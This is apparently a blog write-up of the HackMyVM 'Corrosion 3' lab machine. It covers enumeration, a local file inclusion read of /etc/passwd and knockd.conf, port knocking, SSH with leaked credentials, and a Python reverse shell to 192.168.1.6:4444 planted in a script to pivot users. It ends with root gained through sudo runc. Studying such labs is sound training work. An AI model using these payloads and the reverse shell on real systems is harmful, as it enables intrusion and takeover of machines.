---
layout: post
title: "HackMyVM - Corrosion 3"
date: 2022-04-13 03:16 +0100
categories: hmv
tag: ["LFI", "PortKnocking", "Docker"]
---

Creator: [Proxy](https://hackmyvm.eu/profile/?user=Proxy)
Level: Medium
Release Date: 2022-02-18

## Scan

### NMAP

```
nmap -sV -sC -p- 192.168.1.2
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 03:16 WEST
Nmap scan report for 192.168.1.2
Host is up (0.00030s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
```

### Enumerate

```bash
gobuster dir -u http://192.168.1.2 -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/04/13 03:20:45 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/website              (Status: 301) [Size: 312] [--> http://192.168.1.2/website/]
/server-status        (Status: 403) [Size: 276]                                  
                                                                                 
===============================================================
2022/04/13 03:24:53 Finished
===============================================================
```

### Enumerate Directories

```bash
gobuster dir -u http://192.168.1.2/website/ -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.2/website/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/04/13 03:28:12 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 52549]
/assets               (Status: 301) [Size: 319] [--> http://192.168.1.2/website/assets/]
/logs                 (Status: 301) [Size: 317] [--> http://192.168.1.2/website/logs/]  
/License.txt          (Status: 200) [Size: 1989]                                        
/sales_detail.php     (Status: 200) [Size: 0]                                           
                                                                                        
===============================================================
2022/04/13 03:32:27 Finished
===============================================================
```

### Credentials 

```bash
$ cat login_request.log
```

```http
POST /login/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/login/
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Upgrade-Insecure-Requests: 1

user=randy&pass=RaNDY$SuPer!Secr3etPa$$word
```

```bash
$ cat login_request1.log
```

```http
POST /login/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/login/
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Upgrade-Insecure-Requests: 1

user=test&pass=test
```

### Fuzzing sales_detail.php (LFI)

```bash
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.2/website/sales_detail.php?FUZZ=/etc/passwd |grep -v '0 Ch' 
```

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.2/website/sales_detail.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000508:   200        49 L     86 W       2885 Ch     "shared"       
```

http://192.168.1.2/website/sales_detail.php?shared=/etc/passwd

```txt
root:x:0:0:root:/root:/bin/bash
...[REDACTED]
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
...[REDACTED]
bob:x:1001:1001::/home/bob:/bin/sh
```

## Port Knocking

```
http://192.168.1.2/website/sales_detail.php?shared=/etc/knockd.conf
```

```
 [options] 
     UseSyslog
 
 [openSSH] 
     sequence = 1110,2220,3330 
     seq_timeout = 20 
     tcpflags = syn 
     command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 
 [closeSSH] 
     sequence = 3330,2220,1110 
     seq_timeout = 20 
     command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT 
     tcpflags = syn
 ```

```bash
$ knock 192.168.1.2 1110 2220 3330 -v
hitting tcp 192.168.1.2:1110
hitting tcp 192.168.1.2:2220
hitting tcp 192.168.1.2:3330
```

## SSH

```
randy : RaNDY$SuPer!Secr3etPa$$word
```

### Lateral Movement (/opt/simpleurlencode.py)

```python

#!/usr/bin/python3 

import urllib.parse

string = input("Url Encode String: ")
input = urllib.parse.quote(string)
print("Encoded String: " + input)
```

* ADD reverse shell (Pivot BOB)

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```bash
$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.2] 58718
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bob@corrosion:~$ export TERM=xterm
export TERM=xterm
bob@corrosion:~$ ^Z
zsh: suspended  nc -lvnp 4444

$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

bob@corrosion:~$
```

## ROOT - (docker) [runc](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)

```bash
$ sudo -l
Matching Defaults entries for bob on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on corrosion:
    (root) NOPASSWD: /usr/sbin/runc
```

```
Brief introduction:

RunC is a lightweight tool. It is used to run containers. It is only used to do this, and it should be done well.  
We can think of it as a command-line gadget, which can directly run the container without using the docker engine.  
In fact, runC is the product of standardization, which creates and runs containers according to OCI standards.  
OCI(Open Container Initiative) aims to develop an open industrial standard around container format and runtime
```

```bash
mkdir bundle
cd bundle
mkdir rootfs
runc spec
```

* Edit config.json

```json
{
		"type": "bind",
		"source": "/",
		"destination": "/",
		"options": [ "rbind", "rw", "rprivate" ]
},
```

```bash
bob@corrosion:/tmp/lol/bundle$ sudo runc run bundle
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```